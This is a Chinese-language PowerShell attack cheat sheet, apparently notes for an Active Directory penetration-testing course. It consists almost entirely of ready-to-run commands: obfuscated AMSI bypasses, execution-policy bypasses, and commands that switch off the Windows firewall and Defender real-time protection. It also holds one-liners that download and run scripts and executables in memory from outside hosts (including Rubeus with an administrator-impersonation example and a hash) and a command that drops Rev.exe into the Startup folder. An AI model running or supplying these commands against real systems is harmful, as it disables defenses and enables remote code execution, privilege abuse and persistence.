# 绕过AMSI 

CRTP绕过示例
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

普通AMSL绕过示例
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

不会被PowerShell autologging检测到的绕过示例
```
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

# 绕过powershell执行策略
```
powershell -ep bypass

powershell –ExecutionPolicy bypass

powershell –c <cmd>

$env:PSExecutionPolicyPreference="bypass"

PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 (cmd下)
```


# 关闭防火墙和windows defend
1. 关闭防火墙：
```NetSh Advfirewall set allprofiles state off```

上面命令需要管理员权限，以run as administrator开启一个cmd命令行，然后输入当前域账号登录信息，即可以管理员身份开启cmd，执行上面命令

查看防火墙状态：
```
PS C:\Windows\system32> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

2. 关闭windows defend

获取windefand状态
```
PS C:\ad> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Service
```

以管理员身份运行下面powershll命令(需要重启计算机)：
```reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywar" /d 1 /t REG_DWORD```




关掉实时防护
```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```


# powershell脚本加载

Proxy-aware (加载到内存后直接使用，不会下载到本地)
```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
```

Non-proxy aware
```
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
```

# 下载执行exe程序

需要注意下面所有方法必须先绕过AMSI
```
# Download and run assembly without arguments

$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()


# Download and run Rubeus, with arguments (make sure to split the args)

$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())


# Execute a specific method from an assembly (e.g. a DLL)

$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

# Powershell下载文件

所有版本的powershell
```
(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
```

4+版本
```
Invoke-WebRequest "http://10.10.16.7/Rev.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe"
```

# 枚举所有Applocker策略
```
$ExecutionContext.SessionState.LanguageModeConstrainedLanguage
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```